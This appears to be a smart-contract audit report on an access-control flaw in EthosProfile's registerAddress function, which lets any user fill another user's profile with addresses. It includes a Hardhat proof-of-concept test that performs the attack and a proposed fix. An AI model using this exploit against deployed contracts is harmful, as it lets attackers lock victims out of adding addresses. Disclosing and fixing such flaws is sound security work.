# A user can add addresses to the profile of another user using the `EthosProfile::registerAddress` function


## Impact
### Summary 
The `EthosProfile::registerAddress` function allows a user to add new addresses to their profile by first carrying out some checks such as checking that the new address is not registered to another profile.
However, using this same function, a user can add new addresses to a profile of another user which should not be so.

### Vulnerability Details
The vulnerability lies in the fact that the `EthosProfile::registerAddress` function does not check if the profile with `profileId` belongs to the caller. Thus, just any user by merely knowing that a profile with `profileId` exits can add new addresses to the profile of another user. See https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/EthosProfile.sol#L373-L409


```javascript
  function registerAddress(
    address addressStr,
    uint256 profileId,
    uint256 randValue,
    bytes calldata signature
  ) external whenNotPaused onlyNonZeroAddress(addressStr) {
    (bool verified, bool archived, bool mock) = profileStatusById(profileId);
    if (!verified) {
      revert ProfileNotFound(profileId);
    }
    if (archived || mock) {
      revert ProfileAccess(profileId, "Profile is archived");
    }
    // you may restore your own previously deleted address,
    // but you cannot register an address that has been deleted by another user
    if (profileIdByAddress[addressStr] != profileId && isAddressCompromised[addressStr]) {
      revert AddressCompromised(addressStr);
    }
    (bool addressAlreadyRegistered, , , uint256 registeredProfileId) = profileStatusByAddress(
      addressStr
    );
    if (addressAlreadyRegistered && registeredProfileId != profileId) {
      revert ProfileExistsForAddress(addressStr);
    }


    validateAndSaveSignature(
      _keccakForRegisterAddress(addressStr, profileId, randValue),
      signature
    );


    profiles[profileId].addresses.push(addressStr);
    profileIdByAddress[addressStr] = profileId;


    checkMaxAddresses(profileId);


    emit AddressClaim(profileId, addressStr, AddressClaimStatus.Claimed);
  }

```


### Impact
A malicious user can add new addresses to the profile of another user to the extend of exhausting the number of addresses that can be added to the profile. Even if the user who owns the profile removes those addresses, they are still linked to that profile.
Note that since removed addresses counts in checking if a profile has reached its max number of addresses, a user whose profile has been populated with some other addresses by a malicious user cannot add new addresses even after removing the unwanted addresses.

## Proof of Concept

<details>
<summary>PoC</summary>
Place the following code into `EthosProfile.test.ts`.

```javascript
    it.only('user can add address to the profile of another user', async () => {
      const { ethosProfile, PROFILE_CREATOR_0, EXPECTED_SIGNER, OTHER_0, 
        OTHER_1, OWNER} =
        await loadFixture(deployFixture);

      const profileId = String(1);
      let rand = '123';
      let signature = await common.signatureForRegisterAddress(
        OTHER_0.address,
        profileId,
        rand,
        EXPECTED_SIGNER,
      );

      expect((await ethosProfile.addressesForProfile(1)).length).to.equal(1)

      await ethosProfile.connect(OWNER).inviteAddress(PROFILE_CREATOR_0.address);
      await ethosProfile.connect(PROFILE_CREATOR_0).createProfile(1);

      // PROFILE_CREATOR_0 attempts to add an address to the OWNER profile
      assert(await ethosProfile.addressBelongsToProfile(OWNER.address,1)) // assert that OWNER is the owner of profile with id = 1

      await ethosProfile
        .connect(PROFILE_CREATOR_0)
        .registerAddress(OTHER_0.address, profileId, rand, signature);

      expect((await ethosProfile.addressesForProfile(1)).length).to.equal(2)

      // PROFILE_CREATOR_0 attempts to add another address to the OWNER profile
      rand = '456';
      signature = await common.signatureForRegisterAddress(
        OTHER_1.address,
        profileId,
        rand,
        EXPECTED_SIGNER,
      );
      await ethosProfile
        .connect(PROFILE_CREATOR_0)
        .registerAddress(OTHER_1.address, profileId, rand, signature);

      expect((await ethosProfile.addressesForProfile(1)).length).to.equal(3)
      

    });
```

Now run `npx hardhat test`

Output:
```javascript

  EthosProfile
    deleteAddressAtIndex
      âœ” user can add address to the profile of another user (3737ms)


  1 passing (4s)
```

Manual Review


## Recommended Mitigation Steps
Consider adding a check to ensure that only the owner of a profile can add new addresses to that profile.

```diff
  function registerAddress(
    address addressStr,
    uint256 profileId,
    uint256 randValue,
    bytes calldata signature
  ) external whenNotPaused onlyNonZeroAddress(addressStr) {
+    if(profileIdByAddress[msg.sender] != profileId){
+        revert();
+    }
    (bool verified, bool archived, bool mock) = profileStatusById(profileId);
    if (!verified) {
      revert ProfileNotFound(profileId);
    }
    if (archived || mock) {
      revert ProfileAccess(profileId, "Profile is archived");
    }
    // you may restore your own previously deleted address,
    // but you cannot register an address that has been deleted by another user
    if (profileIdByAddress[addressStr] != profileId && isAddressCompromised[addressStr]) {
      revert AddressCompromised(addressStr);
    }
    (bool addressAlreadyRegistered, , , uint256 registeredProfileId) = profileStatusByAddress(
      addressStr
    );
    if (addressAlreadyRegistered && registeredProfileId != profileId) {
      revert ProfileExistsForAddress(addressStr);
    }


    validateAndSaveSignature(
      _keccakForRegisterAddress(addressStr, profileId, randValue),
      signature
    );


    profiles[profileId].addresses.push(addressStr);
    profileIdByAddress[addressStr] = profileId;


    checkMaxAddresses(profileId);


    emit AddressClaim(profileId, addressStr, AddressClaimStatus.Claimed);
  }
```
